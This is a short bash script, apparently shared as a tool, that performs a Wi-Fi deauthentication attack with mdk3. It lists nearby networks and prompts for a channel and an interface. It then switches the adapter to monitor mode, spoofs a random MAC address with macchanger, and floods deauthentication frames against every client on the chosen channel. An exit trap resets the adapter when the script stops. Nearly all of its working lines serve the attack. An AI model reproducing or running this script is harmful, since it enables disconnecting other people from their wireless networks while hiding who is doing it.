#!/bin/bash

function coolexit()
{
clear
#ifconfig $AD down
ip link set $AD down
macchanger -p $AD
iwconfig $AD mode managed
#ifconfig $AD up
ip link set $AD up
clear
echo -e "\e[1;31mThanks for using this script"
echo -e "Original script made by BlueArduino20"
echo -e "Remastered by digmorepaka"
exit
}

echo -e "\e[1;32m    ____                ____                   __  __             "
echo -e "   / __ \\_      _______/ __ \\___  ____ ___  __/ /_/ /_  ___  _____"
echo -e "  / /_/ / | /| / / ___/ / / / _ \\/ __ \`/ / / / __/ __ \\/ _ \\/ ___/"
echo -e " / ____/| |/ |/ / /  / /_/ /  __/ /_/ / /_/ / /_/ / / /  __/ /    "
echo -e "/_/     |__/|__/_/  /_____/\\___/\\__,_/\\__,_/\\__/_/ /_/\\___/_/     "
echo " "
echo -e " ██▀███ ▓█████ ███▄ ▄███▓▄▄▄       ██████▄▄▄█████▓█████ ██▀███ ▓█████▓█████▄ "
echo -e "▓██ ▒ ██▓█   ▀▓██▒▀█▀ ██▒████▄   ▒██    ▒▓  ██▒ ▓▓█   ▀▓██ ▒ ██▓█   ▀▒██▀ ██▌"
echo -e "▓██ ░▄█ ▒███  ▓██    ▓██▒██  ▀█▄ ░ ▓██▄  ▒ ▓██░ ▒▒███  ▓██ ░▄█ ▒███  ░██   █▌"
echo -e "▒██▀▀█▄ ▒▓█  ▄▒██    ▒██░██▄▄▄▄██  ▒   ██░ ▓██▓ ░▒▓█  ▄▒██▀▀█▄ ▒▓█  ▄░▓█▄   ▌"
echo -e "░██▓ ▒██░▒████▒██▒   ░██▒▓█   ▓██▒██████▒▒ ▒██▒ ░░▒████░██▓ ▒██░▒████░▒████▓ "
echo -e "░ ▒▓ ░▒▓░░ ▒░ ░ ▒░   ░  ░▒▒   ▓▒█▒ ▒▓▒ ▒ ░ ▒ ░░  ░░ ▒░ ░ ▒▓ ░▒▓░░ ▒░ ░▒▒▓  ▒ "
echo -e "  ░▒ ░ ▒░░ ░  ░  ░      ░ ▒   ▒▒ ░ ░▒  ░ ░   ░    ░ ░  ░ ░▒ ░ ▒░░ ░  ░░ ▒  ▒ "
echo -e "  ░░   ░   ░  ░      ░    ░   ▒  ░  ░  ░   ░        ░    ░░   ░   ░   ░ ░  ░ "
echo -e "   ░       ░  ░      ░        ░  ░     ░            ░  ░  ░       ░  ░  ░    "
echo -e "                                                                      ░      "
echo -e ""
                                                                    
echo -e "\e[0;35m                 The MDK3 channel deauther script by BlueArduino20 and digmorepaka"
echo -e "\e[0;17m "
nmcli dev wifi
echo " "
echo -n -e "Choose the target channel: "
read CH
clear
#ifconfig
ip a 
echo -n -e "Choose your wireless interface (example: wlp3s0): "
read WI
echo -e "\e[1;32mStarting the attack... If you want to stop it press CTRL+C."
#ifconfig $WI down
ip link set $WI down
iwconfig $WI mode monitor
macchanger -r $WI
#ifconfig $WI up
ip link set $WI up
trap coolexit EXIT
mdk3 $WI d -c $CH
